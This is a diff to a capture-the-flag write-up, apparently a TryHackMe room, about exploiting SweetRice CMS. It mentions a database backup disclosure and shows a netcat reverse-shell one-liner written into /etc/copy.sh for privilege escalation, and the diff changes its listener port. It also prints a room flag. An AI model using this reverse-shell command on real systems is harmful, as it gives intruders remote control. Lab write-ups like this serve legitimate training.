@@ -103,10 +103,12 @@ Task Completed
 
 Welcome to SweetRice - Thank your for install SweetRice as your website management system.
 
-# image
 
 
 # Find Exploit For Sweetrice 
+
+![image alt]()
+![image alt]()
 
 1. Backup Disclosure 
  You can access to all mysql backup and download them from this directory
@@ -234,7 +236,7 @@ now we OverWrite this file with shell code
 
 `
 $cat /etc/copy.sh 
-'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9002 >/tmp/f' 
+'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 5554 >/tmp/f' 
 `
 
 this is Standard one liner shell 
@@ -242,7 +244,7 @@ this is Standard one liner shell
 now Over Write this with your Ip to get shell   
 
 `
-$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9002 >/tmp/f' >/etc/copy.sh
+$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 5554 >/tmp/f' >/etc/copy.sh
 `
 Done
 
@@ -281,15 +283,6 @@ THM{6637f41d0177b6f37cb20d775124699f}
 `THM{6637f41d0177b6f37cb20d775124699f}`
 
 
-
-
-
-
-
-
-
-
-
-
+Share And Support 
 
 
